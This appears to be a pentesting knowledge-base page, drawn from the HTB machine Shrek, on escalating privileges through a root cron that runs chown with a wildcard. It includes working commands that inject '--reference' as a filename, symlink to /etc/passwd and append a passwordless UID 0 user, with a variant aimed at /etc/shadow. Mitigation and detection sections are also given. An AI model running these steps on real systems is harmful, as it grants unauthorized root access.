---
topic: chown with a wildcard — changing ownership of critical files
tags: [linux, chown, wildcard, symlink, cron, privesc, shrek]
---

# chown with a wildcard — changing ownership of critical files

[🌐 Español](chown-wildcard-privesc.md) | **English**

## Idea

A privileged script running `chown user:group *` expands the wildcard with the names present in the directory. If the attacker can create files there, they control that list. A symlink to a critical file makes `chown` (which follows links by default) change the real target's owner; if the attacker can write to it, privilege escalation follows. On Shrek the cron ran `chown nobody:nobody *` on a writable directory and a symlink to `/etc/passwd` allowed adding a UID 0 user.

## When it applies

- A cron or privileged script uses `chown`, `chmod` or `rm` with `*`.
- The directory is writable by an unprivileged user.
- The command follows symlinks (the default for `chown` and `chmod`).
- A critical file's owner or permissions can be changed.

## Procedure

1. Enumerate scheduled tasks with `pspy` and the cron scripts.
2. Locate the wildcard command and its working directory.
3. Check whether the directory is writable.
4. Create a reference file owned by the attacker plus another named `--reference=<reference>`.
5. Create a symlink with a name the wildcard includes, pointing at the target.
6. Wait for execution and check the owner.
7. Edit the file (for example `/etc/passwd`) and gain root.

## Commands

```bash
pspy -pf -i 1000
ls -la /cron/directory
cd /writable/path
touch ref.txt                  # owned by the attacker
touch -- --reference=ref.txt   # option injected into the wildcard
ln -s /etc/passwd passwd       # chown follows the link
# the cron runs: chown nobody:nobody --reference=ref.txt passwd
ls -l /etc/passwd
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned
```

```bash
# variant with options injected in the filename
touch -- '--reference=/etc/shadow'
```

## Variants

- Inject options such as `--reference` or `--from` in the filename.
- Use a name starting with `-` to alter the command's behaviour.
- Apply the same idea to `chmod`, `rm`, `tar` or `rsync` with wildcards.
- If the cron uses `find`, check whether it follows symlinks (`-L`).

## Limitations

- `chown -h` changes the link, not the target.
- `find ... -type f` excludes symlinks.
- The directory must be writable and the cron must run as root.
- Some systems make `/etc/passwd` immutable or protect it with SELinux.

## Mitigation

- Avoid wildcards in privileged scripts; use `find` with `-type f` and an absolute path.
- Run `chown` with `-h` and `--` to separate options from names.
- Restrict writes to directories processed by cron.
- Protect `/etc/passwd`, `/etc/shadow` and `/etc/sudoers` with permissions and immutability.
- Audit owner changes on system files.

## Detection

- New symlinks in cron-processed directories.
- Ownership changes on `/etc/passwd`, `/etc/shadow` or `/etc/sudoers`.
- Filenames starting with `-` or containing `--`.
- UID 0 users added outside identity management.

## References

- [Leon Juranic — Exploiting wildcards in Unix](https://www.exploit-db.com/papers/33930)
- [GTFOBins — chown](https://gtfobins.github.io/gtfobins/chown/)
- [0xdf — Shrek](https://0xdf.gitlab.io/2020/07/22/htb-shrek.html)
- [Shrek writeup](../../machines/linux/shrek/README.en.md)
